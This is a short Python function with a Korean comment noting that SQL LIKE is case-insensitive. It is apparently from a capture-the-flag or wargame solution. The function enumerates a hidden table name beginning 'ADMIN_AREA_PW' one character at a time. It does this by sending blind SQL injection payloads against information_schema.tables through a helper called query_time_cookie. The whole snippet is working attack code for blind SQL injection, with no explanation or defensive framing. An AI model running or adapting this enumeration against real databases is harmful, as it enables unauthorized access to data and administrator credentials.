# LIKE는 대소문자 구분이 없어 guessing한 결과를 그대로 써도 안될 수 있다

def guess_table_name2():
    name = "ADMIN_AREA_PW"
    while True:
        find = False
        for i in range(48, 123):
            c = chr(i)
            result = query_time_cookie("IF(EXISTS (SELECT table_name FROM information_schema.tables WHERE table_name LIKE '{}%%'), 1, 0)".format(name+c) )
            if (result == 1):
                name += c
                print(name)
                find = True
                break
        if (not find):
            print(name)
            return name